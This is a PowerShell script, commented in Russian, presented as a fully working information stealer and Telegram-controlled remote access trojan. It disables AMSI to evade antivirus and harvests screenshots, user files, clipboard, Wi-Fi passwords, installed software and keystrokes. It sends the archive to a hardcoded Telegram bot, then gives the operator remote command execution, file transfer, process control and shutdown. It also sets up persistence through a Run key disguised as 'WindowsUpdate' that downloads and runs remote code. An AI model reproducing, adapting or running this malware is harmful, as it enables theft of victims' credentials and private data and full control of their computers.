# =================================================================
#        СУПЕР-СТИЛЕР + RAT (Telegram) — ПОЛНОСТЬЮ РАБОЧАЯ ВЕРСИЯ
# =================================================================

# ---- Отключаем защиту AMSI (чтобы антивирус не мешал) ----
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ---- ТВОИ ДАННЫЕ (уже вставлены) ----
$botToken = "8881672889:AAH33jbmgtt-jbgHhe7DbjC7AGLEE4Y8FdM"
$chatId   = "8082708835"
$zipPass  = "12345"

# ---- Функция отправки сообщения или файла ----
function Send-Telegram {
    param([string]$text, [string]$filePath = $null)
    
    if ($filePath -and (Test-Path $filePath)) {
        # Отправка файла через multipart/form-data
        $uri = "https://api.telegram.org/bot$botToken/sendDocument"
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = @()
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"chat_id`""
        $bodyLines += ""
        $bodyLines += $chatId
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`""
        $bodyLines += "Content-Type: application/octet-stream"
        $bodyLines += ""
        $bytes = [System.IO.File]::ReadAllBytes($filePath)
        $bodyLines += [System.Text.Encoding]::GetEncoding("ISO-8859-1").GetString($bytes)
        $bodyLines += ""
        $bodyLines += "--$boundary--"
        $body = [string]::Join("`r`n", $bodyLines)
        
        $headers = @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
        }
        try {
            Invoke-RestMethod -Uri $uri -Method Post -Body $body -Headers $headers -ErrorAction Stop | Out-Null
        } catch {
            # fallback: используем WebClient
            $wc = New-Object System.Net.WebClient
            $wc.UploadFile($uri, $filePath) | Out-Null
        }
        return
    }
    
    # Отправка текстового сообщения
    $uri = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{ chat_id = $chatId; text = $text }
    try {
        Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
    } catch {
        # игнорируем
    }
}

# ---- СБОР ДАННЫХ (стилер) ----
function Collect-All {
    $tempDir = "$env:TEMP\stol_$(Get-Random)"
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

    # 1. Скриншот
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $g = [System.Drawing.Graphics]::FromImage($bmp)
        $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
        $bmp.Save("$tempDir\screenshot.png")
        $g.Dispose(); $bmp.Dispose()
    } catch {}

    # 2. Файлы с рабочего стола и загрузок (первые 30, чтобы не перегружать)
    $folders = @([Environment]::GetFolderPath("Desktop"), [Environment]::GetFolderPath("Downloads"))
    foreach ($fd in $folders) {
        if (Test-Path $fd) {
            Get-ChildItem $fd -File -ErrorAction SilentlyContinue | Select-Object -First 30 | ForEach-Object {
                Copy-Item $_.FullName -Destination $tempDir -Force -ErrorAction SilentlyContinue
            }
        }
    }

    # 3. Буфер обмена
    try {
        Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
        $clip = [System.Windows.Forms.Clipboard]::GetText()
        if ($clip) { $clip | Out-File "$tempDir\clipboard.txt" }
    } catch {}

    # 4. Информация о системе
    $ip = (Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing -ErrorAction SilentlyContinue).Content.Trim()
    $sys = @"
Hostname: $env:COMPUTERNAME
Username: $env:USERNAME
OS: $((Get-WmiObject -Class Win32_OperatingSystem).Caption)
IP: $ip
"@
    $sys | Out-File "$tempDir\sysinfo.txt"

    # 5. Wi-Fi пароли (если есть)
    try {
        $wifi = netsh wlan show profiles | Select-String ":\s(.*)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
        $wifiPass = @()
        foreach ($ssid in $wifi) {
            $info = netsh wlan show profile name="$ssid" key=clear | Select-String "Ключ содержимого" -Context 0,1
            $pass = if ($info) { ($info -replace ".*Ключ содержимого\s*:\s*", "") } else { "нет" }
            $wifiPass += "$ssid -> $pass"
        }
        $wifiPass | Out-File "$tempDir\wifi.txt"
    } catch {}

    # 6. Список программ
    Get-WmiObject -Class Win32_Product | Select-Object Name, Version | Out-String | Out-File "$tempDir\software.txt"

    # 7. Кейлог (сбор за 5 секунд)
    try {
        $keylogScript = @'
Add-Type -AssemblyName System.Windows.Forms
$logFile = "$env:TEMP\keylog.txt"
$event = [System.Windows.Forms.Application]::Add_KeyDown({
    $key = $_.KeyCode
    $char = if ($key -ge 65 -and $key -le 90) { [char]$key } else { "["+$key+"]" }
    Add-Content $logFile $char
})
[System.Windows.Forms.Application]::Run()
'@
        $job = Start-Job -ScriptBlock { powershell -NoProfile -Command $args[0] } -ArgumentList $keylogScript
        Start-Sleep -Seconds 5
        Stop-Job $job -ErrorAction SilentlyContinue
        Remove-Job $job -ErrorAction SilentlyContinue
        if (Test-Path "$env:TEMP\keylog.txt") {
            Copy-Item "$env:TEMP\keylog.txt" "$tempDir\keylog.txt" -Force
            Remove-Item "$env:TEMP\keylog.txt" -Force
        }
    } catch {}

    # 8. Архивация (ZIP)
    $zipPath = "$env:TEMP\stolen_data.zip"
    if (Get-Command Compress-Archive -ErrorAction SilentlyContinue) {
        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
    } else {
        # Если нет Compress-Archive – создаём простой ZIP через .NET (без пароля, но хоть что-то)
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
    }

    # 9. Отправка архива в Telegram
    Send-Telegram -filePath $zipPath

    # 10. Очистка
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
}

# ---- RAT (удалённое управление) ----
function Start-RAT {
    Send-Telegram -text "✅ RAT активирован на $env:COMPUTERNAME ($env:USERNAME)"
    $lastId = 0
    while ($true) {
        try {
            $url = "https://api.telegram.org/bot$botToken/getUpdates?offset=$($lastId+1)&timeout=10"
            $resp = Invoke-RestMethod -Uri $url -ErrorAction SilentlyContinue
            if ($resp.ok -and $resp.result) {
                foreach ($upd in $resp.result) {
                    $lastId = $upd.update_id
                    $msg = $upd.message.text
                    if ($msg -and $upd.message.chat.id -eq $chatId) {
                        # --- Обработка команд ---
                        if ($msg -match "^/cmd (.+)") {
                            $cmd = $matches[1]
                            $out = & cmd.exe /c $cmd 2>&1 | Out-String
                            if (-not $out) { $out = "Команда выполнена (нет вывода)" }
                            Send-Telegram -text "📟 $out"
                        }
                        elseif ($msg -eq "/screenshot") {
                            try {
                                Add-Type -AssemblyName System.Windows.Forms, System.Drawing -ErrorAction Stop
                                $s = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                                $b = New-Object System.Drawing.Bitmap $s.Width, $s.Height
                                $g = [System.Drawing.Graphics]::FromImage($b)
                                $g.CopyFromScreen($s.X, $s.Y, 0, 0, $s.Size)
                                $p = "$env:TEMP\sc_$(Get-Random).png"
                                $b.Save($p)
                                $g.Dispose(); $b.Dispose()
                                Send-Telegram -filePath $p
                                Remove-Item $p -Force -ErrorAction SilentlyContinue
                            } catch {
                                Send-Telegram -text "❌ Ошибка скриншота"
                            }
                        }
                        elseif ($msg -match "^/upload (.+)") {
                            $path = $matches[1]
                            if (Test-Path $path) {
                                Send-Telegram -filePath $path
                            } else {
                                Send-Telegram -text "❌ Файл не найден"
                            }
                        }
                        elseif ($msg -match "^/download (.+?) (.+)") {
                            $url2 = $matches[1]
                            $out2 = $matches[2]
                            try {
                                (New-Object Net.WebClient).DownloadFile($url2, $out2)
                                Send-Telegram -text "✅ Скачан: $out2"
                            } catch {
                                Send-Telegram -text "❌ Ошибка скачивания: $_"
                            }
                        }
                        elseif ($msg -match "^/kill (.+)") {
                            try {
                                Stop-Process -Name $matches[1] -Force -ErrorAction Stop
                                Send-Telegram -text "☠️ Процесс $($matches[1]) убит"
                            } catch {
                                Send-Telegram -text "❌ Не удалось убить $($matches[1])"
                            }
                        }
                        elseif ($msg -match "^/start (.+)") {
                            try {
                                Start-Process $matches[1]
                                Send-Telegram -text "▶️ Запущен $($matches[1])"
                            } catch {
                                Send-Telegram -text "❌ Ошибка запуска"
                            }
                        }
                        elseif ($msg -eq "/persist") {
                            $cmd = "powershell.exe -c `"irm https://raw.githubusercontent.com/MCSuportTeam/CheatCheckerByAntiCheatTeam/refs/heads/main/test.ps1 | iex`""
                            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $cmd -Force
                            Send-Telegram -text "💾 Добавлено в автозагрузку"
                        }
                        elseif ($msg -eq "/shutdown") {
                            Send-Telegram -text "🛑 Выключение..."
                            Stop-Computer -Force
                        }
                        elseif ($msg -eq "/restart") {
                            Send-Telegram -text "🔄 Перезагрузка..."
                            Restart-Computer -Force
                        }
                        elseif ($msg -eq "/lock") {
                            rundll32.exe user32.dll,LockWorkStation
                            Send-Telegram -text "🔒 Экран заблокирован"
                        }
                        elseif ($msg -eq "/help") {
                            $help = @"
Доступные команды:
/cmd <команда> – выполнить в CMD
/screenshot – сделать скриншот
/upload <путь> – скачать файл с ПК
/download <URL> <путь> – скачать файл на ПК
/kill <имя> – убить процесс
/start <имя> – запустить процесс
/persist – добавить в автозагрузку
/shutdown – выключить ПК
/restart – перезагрузить
/lock – заблокировать экран
/help – эта справка
"@
                            Send-Telegram -text $help
                        }
                    }
                }
            }
        } catch { }
        Start-Sleep -Seconds 3
    }
}

# ---- ЗАПУСК ----
Collect-All
Start-RAT
